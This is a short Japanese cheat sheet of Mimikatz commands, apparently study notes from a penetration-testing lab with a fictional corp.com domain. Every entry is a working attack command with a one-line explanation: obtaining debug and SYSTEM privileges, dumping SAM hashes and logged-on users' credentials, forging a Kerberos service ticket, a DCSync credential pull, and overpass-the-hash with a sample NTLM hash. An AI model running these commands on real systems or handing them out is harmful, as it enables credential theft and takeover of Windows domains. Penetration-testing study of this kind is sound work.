# Mimikatz
[Documentation]()

## コマンド集

1. Mimikatzのプロセスにデバッグ権限を要求して、認証情報の抽出を可能にする。SeDebugPrivlege権限を取得する。
```
privilege::debug
```

2. SYSTEM権限に昇格する
```
token::elevate
```

3. SAMデータベースからユーザのNTLMハッシュをダンプする
```
lsadump::sam
```

4. Sekurlsaモジュールを使ってログオンしているすべてのユーザの資格情報、ハッシュをダンプする
```
sekurlsa::logonpasswords
```

5. jeffadminユーザとして、ターゲットのweb04.corp.comサービスにおける認証チケットを作成する。
```
kerberos::golden /sid:<sid> /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:(ターゲットNTLMハッシュ) /user:jeffadmin
```

6. DCSYNC攻撃をするためのコマンドで、/userの引数にドメイン\ユーザの形式で指定。これでターゲットユーザの資格情報を取得できる。
```
lsadump::dcsync /user:corp\dave
```

7. Pass the HashではなくOverpass the Hash攻撃。ターゲットユーザのNTLMハッシュを使ってpowershellを起動する。  
PtHとの違いとして、Kerberosを使って認証している点がある。
```
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```